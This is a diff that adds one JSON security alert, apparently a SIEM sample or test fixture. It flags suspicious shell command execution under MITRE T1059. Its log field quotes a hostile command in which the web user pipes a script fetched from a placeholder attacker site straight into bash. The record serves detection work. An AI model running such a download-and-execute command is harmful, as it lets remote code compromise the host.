@@ -1,0 +1,10 @@
+{
+  "timestamp": "2025-12-16T10:15:00.000+0000",
+  "rule": {
+    "level": 12,
+    "description": "Suspicious command execution via Shell.",
+    "mitre": { "id": ["T1059"], "technique": ["Command and Scripting Interpreter"] }
+  },
+  "src_ip": "192.168.1.55",
+  "full_log": "User www-data executed: 'wget http://evil-site.com/exploit.sh | bash'"
+}
